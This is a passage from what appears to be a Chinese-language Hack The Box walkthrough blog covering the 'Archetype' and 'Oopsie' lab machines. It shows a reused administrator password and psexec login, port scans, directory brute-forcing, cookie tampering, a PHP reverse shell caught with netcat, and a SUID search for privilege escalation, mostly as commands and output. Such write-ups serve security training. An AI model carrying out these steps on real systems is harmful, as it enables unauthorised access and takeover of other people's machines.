class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\sql_svc\Desktop&gt;<span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is 9565-0B4F<br><br> Directory of C:\Users\sql_svc\Desktop<br><br>01/20/2020  06:42 AM    &lt;DIR&gt;          .<br>01/20/2020  06:42 AM    &lt;DIR&gt;          ..<br>02/25/2020  07:37 AM                32 user.txt<br>               1 File(s)             32 bytes<br>               2 Dir(s)  10,717,413,376 bytes free<br><br>C:\Users\sql_svc\Desktop&gt;<span class="hljs-built_in">type</span> user.txt<br><br></code></pre></td></tr></table></figure><p>查看 powshell 历史的文件，找到了用户名和密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br>    C:\Users\Default\NTUSER.DAT<br>    C:\Users\sql_svc\NTUSER.DAT<br><br>▒▒▒▒▒▒▒▒▒▒͹ Analyzing Other Windows Files Files (<span class="hljs-built_in">limit</span> 70)<br><br>       /---------------------------------------------------------------------------\<br>       |                             Do you like PEASS?                            |<br>       |---------------------------------------------------------------------------|<br>       |         Become a Patreon    :     https://www.patreon.com/peass           |<br>       |         Follow on Twitter   :     @carlospolopm                           |<br>       |         Respect on HTB      :     SirBroccoli &amp; makikvues                 |<br>       |---------------------------------------------------------------------------|<br>       |                                 Thank you!                                |<br>       \---------------------------------------------------------------------------/<br><br>PS C:\Users\sql_svc\Downloads&gt; <span class="hljs-built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br><span class="hljs-built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br>net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!<br><br></code></pre></td></tr></table></figure><p>最后使用 impacket-psexec 来连接 administrator</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/tools/windows]<br>└─$ impacket-psexec administrator@10.129.142.66<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>Password:<br>[*] Requesting shares on 10.129.142.66.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file baWlxTKg.exe<br>[*] Opening SVCManager on 10.129.142.66.....<br>[*] Creating service Waku on 10.129.142.66.....<br>[*] Starting service Waku.....<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands                                                                                                                                                                                                Microsoft Windows [Version 10.0.17763.2061]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt; <span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;C:\Users\Administrator\Desktop&quot;</span><br>C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">dir</span>                                                                                                                                                                                                     Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is 9565-0B4F<br><br> Directory of C:\Users\Administrator\Desktop<br><br>07/27/2021  02:30 AM    &lt;DIR&gt;          .<br>07/27/2021  02:30 AM    &lt;DIR&gt;          ..<br>02/25/2020  07:36 AM                32 root.txt<br>               1 File(s)             32 bytes<br>               2 Dir(s)  10,688,098,304 bytes free<br><br>C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">type</span> root.txt <br></code></pre></td></tr></table></figure><h2 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h2><h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.129.95.191<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 22:23 EDT<br>Warning: 10.129.95.191 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.95.191<br>Host is up (0.057s latency).<br>Not shown: 65011 closed tcp ports (reset), 522 filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 28.72 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap -sT -sV -sC -p22,80 10.129.95.191<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 22:24 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.95.191<br>Host is up (0.0036s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   2048 61e43fd41ee2b2f10d3ced36283667c7 (RSA)<br>|   256 241da417d4e32a9c905c30588f60778d (ECDSA)<br>|_  256 78030eb4a1afe5c2f98d29053e29c9f2 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-title: Welcome<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.18 seconds<br><br></code></pre></td></tr></table></figure><p>可以判断出的内容：Ubuntu 系统、Apache 搭建，开放了 22 和 80 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 10.129.95.191<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 22:25 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.95.191<br>Host is up (0.0033s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">| http-internal-ip-disclosure:</span><br><span class="hljs-string">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="hljs-string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 32.10 seconds</span><br></code></pre></td></tr></table></figure><h3 id="Web-渗透-1"><a href="#Web-渗透-1" class="headerlink" title="Web 渗透"></a>Web 渗透</h3><p>nmap 自带的漏扫没什么有价值的信息，看一看浏览器端吧</p><p><img src="/pic/7d1a9d8bf06ab1095cb4b52a5cdca331_MD5.png"></p><p>翻了翻似乎没什么有效的点击按钮，F12 看看</p><p><img src="/pic/8fd251c6d5a109ceafd8efd6e7f954c5_MD5.png"></p><p>似乎看到了登录的地址</p><p><img src="/pic/8aa2743c4b37494548ff02ef7dc05543_MD5.png"></p><p>Wappalyzer 的结果显示这是 php 搭建的页面（在源码中也能看到），没有后台管理的产品名称，不过有个游客登陆的选项，点进去看看</p><p><img src="/pic/ba19f350b7c36e411877fe19c62ba443_MD5.png"></p><h3 id="修改cookies"><a href="#修改cookies" class="headerlink" title="修改cookies"></a>修改cookies</h3><p>进入之后发现了 uploads 选项，那就尝试点进去吧。上传界面提示仅限 super admin 才有操作权限</p><p><img src="/pic/8362415ba532e5c956f13260a488d665_MD5.png"></p><p>看一眼控制台，原来它是靠 cookies 来判断游客和管理员的，点击账户发现，看到了如下内容</p><p><img src="/pic/54e0d9a59f4bf89922bdbf83ccb262da_MD5.png"></p><p>这里观察 URL 发现：id&#x3D;2，那我们肯定要试试直接修改 URL，会有什么样的结果</p><p><img src="/pic/885356170ad324ddeb542fc447677315_MD5.png"></p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>拿到了管理员的 id，那我们直接修改 cookie 试试看，修改后应该可以直接访问上传文件的界面</p><p><img src="/pic/64b23ae0563a137afaa9db04c87c3353_MD5.png"></p><p>确实可以上传文件了，我们直接使用 php reverse shell，修改其中的 ip，那接下来的问题是，上传文件后怎么访问，也就是上传后的文件路径，目录爆破一下吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://10.129.95.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://10.129.95.191<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/06/02 22:50:31 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/images               (Status: 301) [Size: 315] [--&gt; http://10.129.95.191/images/]<br>/themes               (Status: 301) [Size: 315] [--&gt; http://10.129.95.191/themes/]<br>/uploads              (Status: 301) [Size: 316] [--&gt; http://10.129.95.191/uploads/]<br>/css                  (Status: 301) [Size: 312] [--&gt; http://10.129.95.191/css/]<br>/js                   (Status: 301) [Size: 311] [--&gt; http://10.129.95.191/js/]<br>/fonts                (Status: 301) [Size: 314] [--&gt; http://10.129.95.191/fonts/]<br>/server-status        (Status: 403) [Size: 278]<br>Progress: 220289 / 220561 (99.88%)<br>===============================================================<br>2023/06/02 22:52:02 Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure><p>目录爆破直接就有 uploads，我们尝试访问 uploads，提示 <code>Directory listing not allowed here.</code> 虽然不能展示目录，但是我们上传的文件大概率传输到了这个目录下，尝试开启监听后，访问目标文件，反弹 shell 成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nc -lvnp 1234<br>listening on [any] 1234 ...<br><br>connect to [10.10.14.109] from (UNKNOWN) [10.129.95.191] 36364<br>Linux oopsie 4.15.0-76-generic <span class="hljs-comment">#86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br> 02:57:08 up 44 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.04, 0.02<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ $ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">/bin/sh: 2: python: not found</span><br><span class="hljs-string">$ python3 -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@oopsie:/$ whoami</span><br><span class="hljs-string">whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">www-data@oopsie:/$ uname -a</span><br><span class="hljs-string">uname -a</span><br><span class="hljs-string">Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">www-data@oopsie:/$ sudo -l</span><br><span class="hljs-string">sudo -l</span><br><span class="hljs-string">[sudo] password for www-data:</span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">[sudo] password for www-data:</span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">[sudo] password for www-data:</span><br><span class="hljs-string"></span><br><span class="hljs-string">sudo: 3 incorrect password attempts</span><br><span class="hljs-string">www-data@oopsie:/$</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>接下来考虑如何提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">robert@oopsie:/var/www/html/cdn-cgi/login$ <span class="hljs-built_in">cat</span> /etc/passwd<br><span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin<br>syslog:x:102:106::/home/syslog:/usr/sbin/nologin<br>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin<br>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin<br>lxd:x:105:65534::/var/lib/lxd/:/bin/false<br>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin<br>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin<br>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:109:1::/var/cache/pollinate:/bin/false<br>sshd:x:110:65534::/run/sshd:/usr/sbin/nologin<br>robert:x:1000:1000:robert:/home/robert:/bin/bash<br>mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false<br>robert@oopsie:/var/www/html/cdn-cgi/login$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><p>passwd 文件和定时任务没有收获</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@oopsie:/$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>       66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/11420/bin/mount<br>       80     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/11420/bin/ping<br>       81     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/11420/bin/ping6<br>       98     40 -rwsr-xr-x   1 root     root        40128 Mar 25  2019 /snap/core/11420/bin/su<br>      116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/11420/bin/umount<br>     2618     71 -rwsr-xr-x   1 root     root        71824 Mar 25  2019 /snap/core/11420/usr/bin/chfn<br>     2620     40 -rwsr-xr-x   1 root     root        40432 Mar 25  2019 /snap/core/11420/usr/bin/chsh<br>     2697     74 -rwsr-xr-x   1 root     root        75304 Mar 25  2019 /snap/core/11420/usr/bin/gpasswd<br>     2789     39 -rwsr-xr-x   1 root     root        39904 Mar 25  2019 /snap/core/11420/usr/bin/newgrp<br>     2802     53 -rwsr-xr-x   1 root     root        54256 Mar 25  2019 /snap/core/11420/usr/bin/passwd<br>     2912    134 -rwsr-xr-x   1 root     root       136808 Jan 20  2021 /snap/core/11420/usr/bin/sudo<br>     3011     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/11420/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     3383    419 -rwsr-xr-x   1 root     root              428240 Jun  7  2021 /snap/core/11420/usr/lib/openssh/ssh-keysign<br>     6457    109 -rwsr-xr-x   1 root     root              111080 Jul 14  2021 /snap/core/11420/usr/lib/snapd/snap-confine<br>     7638    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/11420/usr/sbin/pppd<br>       66     40 -rwsr-xr-x   1 root     root               40152 Jan 27  2020 /snap/core/11743/bin/mount<br>       80     44 -rwsr-xr-x   1 root     root               44168 May  7  2014 /snap/core/11743/bin/ping<br>       81     44 -rwsr-xr-x   1 root     root               44680 May  7  2014 /snap/core/11743/bin/ping6<br>       98     40 -rwsr-xr-x   1 root     root               40128 Mar 25  2019 /snap/core/11743/bin/su<br>      116     27 -rwsr-xr-x   1 root     root               27608 Jan 27  2020 /snap/core/11743/bin/umount<br>     2618     71 -rwsr-xr-x   1 root     root               71824 Mar 25  2019 /snap/core/11743/usr/bin/chfn<br>     2620     40 -rwsr-xr-x   1 root     root               40432 Mar 25  2019 /snap/core/11743/usr/bin/chsh<br>     2697     74 -rwsr-xr-x   1 root     root               75304 Mar 25  2019 /snap/core/11743/usr/bin/gpasswd<br>     2789     39 -rwsr-xr-x   1 root     root               39904 Mar 25  2019 /snap/core/11743/usr/bin/newgrp<br>     2802     53 -rwsr-xr-x   1 root     root               54256 Mar 25  2019 /snap/core/11743/usr/bin/passwd<br>     2912    134 -rwsr-xr-x   1 root     root              136808 Jan 20  2021 /snap/core/11743/usr/bin/sudo<br>     3011     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/11743/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     3383    419 -rwsr-xr-x   1 root     root              428240 Jun  7  2021 /snap/core/11743/usr/lib/openssh/ssh-keysign<br>     6457    109 -rwsr-xr-x   1 root     root              111080 Aug 27  2021 /snap/core/11743/usr/lib/snapd/snap-confine<br>     7638    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/11743/usr/sbin/pppd<br>    26836     32 -rwsr-xr-x   1 root     root               30800 Aug 11  2016 /bin/fusermount<br>    26889     28 -rwsr-xr-x   1 root     root               26696 Aug 22  2019 /bin/umount<br>    26845     44 -rwsr-xr-x   1 root     root               43088 Aug 22  2019 /bin/mount<br>    26887     64 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /bin/ping<br>    26903     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /bin/su<br>   264784     44 -rwsr-xr--   1 root     messagebus         42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   264653    108 -rwsr-sr-x   1 root     root              109432 Oct 30  2019 /usr/lib/snapd/snap-confine<br>   264974    428 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign<br>   264791     12 -rwsr-xr-x   1 root     root               10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>   264978     16 -rwsr-xr-x   1 root     root               14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>   396049    100 -rwsr-xr-x   1 root     root              100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>   264421     40 -rwsr-xr-x   1 root     root               37136 Mar 22  2019 /usr/bin/newuidmap<br>   264437     60 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /usr/bin/passwd<br>   264164     52 -rwsr-sr-x   1 daemon   daemon             51464 Feb 20  2018 /usr/bin/at<br>   264151     12 -rwsr-xr--   1 root     bugtracker          8792 Jan 25  2020 /usr/bin/bugtracker<br>   264420     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /usr/bin/newgrp<br>   264457     24 -rwsr-xr-x   1 root     root               22520 Mar 27  2019 /usr/bin/pkexec<br>   264215     76 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /usr/bin/chfn<br>   264217     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /usr/bin/chsh<br>   264598     20 -rwsr-xr-x   1 root     root               18448 Jun 28  2019 /usr/bin/traceroute6.iputils<br>   264419     40 -rwsr-xr-x   1 root     root               37136 Mar 22  2019 /usr/bin/newgidmap<br>   264310     76 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /usr/bin/gpasswd<br>   262535    148 -rwsr-xr-x   1 root     root              149080 Jan 19  2021 /usr/bin/sudo<br><br></code></pre></td></tr></table></figure><p>s 权限的文件很多，但是真正有效的却几乎没有，不过有个特殊的文件 bugtracker，似乎不是系统文件，去看看吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@oopsie:/$ <span class="hljs-built_in">ls</span> -liah /usr/bin/bugtracker<br><span class="hljs-built_in">ls</span> -liah /usr/bin/bugtracker<br>264151 -rwsr-xr-- 1 root bugtracker 8.6K Jan 25  2020 /usr/bin/bugtracker<br>www-data@oopsie:/$ file /usr/bin/bugtracker<br>file /usr/bin/bugtracker<br>/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, 